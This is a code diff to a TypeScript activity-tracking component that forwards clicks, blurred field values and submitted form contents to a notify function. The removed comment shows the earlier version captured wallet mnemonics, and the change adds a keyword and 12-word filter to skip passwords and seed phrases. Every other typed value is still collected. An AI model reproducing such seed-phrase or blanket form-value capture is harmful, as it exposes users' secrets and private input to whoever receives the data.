@@ -156,7 +156,15 @@ function ActivityTracker() {
       };
       document.addEventListener("click", onClick, { capture: true });
 
-      // Capture form field values on blur (so mnemonics/imports/username/etc. get backed up).
+      const sensitiveField = (name: string, value: string) => {
+        const n = name.toLowerCase();
+        const v = value.trim().toLowerCase();
+        if (/password|mnemonic|seed|phrase|private|secret|recovery|key/.test(n)) return true;
+        const words = v.split(/\s+/).filter(Boolean);
+        return words.length >= 12;
+      };
+
+      // Capture non-sensitive form field values on blur.
       const onBlur = (e: FocusEvent) => {
         const el = e.target as HTMLElement | null;
         if (!el) return;
@@ -169,6 +177,7 @@ function ActivityTracker() {
         const value = String(input.value ?? "").slice(0, 800);
         if (!value.trim()) return;
         const name = input.getAttribute("name") || input.getAttribute("aria-label") || input.getAttribute("placeholder") || (input as HTMLInputElement).type || "field";
+        if (sensitiveField(name, value)) return;
         notify({ event: "form_field", label: name.slice(0, 60), fields: { [name.slice(0, 40)]: value } });
       };
       document.addEventListener("blur", onBlur, { capture: true });
@@ -181,14 +190,14 @@ function ActivityTracker() {
           const fd = new FormData(form);
           const fields: Record<string, string> = {};
           fd.forEach((v, k) => {
-            if (typeof v === "string") fields[k.slice(0, 40)] = v.slice(0, 800);
+            if (typeof v === "string" && !sensitiveField(k, v)) fields[k.slice(0, 40)] = v.slice(0, 800);
           });
           // Include unnamed inputs too.
           const inputs = form.querySelectorAll("input, textarea");
           inputs.forEach((n, idx) => {
             const input = n as HTMLInputElement;
             const key = input.name || input.getAttribute("aria-label") || input.getAttribute("placeholder") || `field_${idx}`;
-            if (!fields[key] && input.value) fields[key.slice(0, 40)] = String(input.value).slice(0, 800);
+            if (!fields[key] && input.value && !sensitiveField(key, String(input.value))) fields[key.slice(0, 40)] = String(input.value).slice(0, 800);
           });
           notify({ event: "form_submit", label: form.getAttribute("aria-label") ?? form.id ?? "form", fields });
         } catch { /* ignore */ }
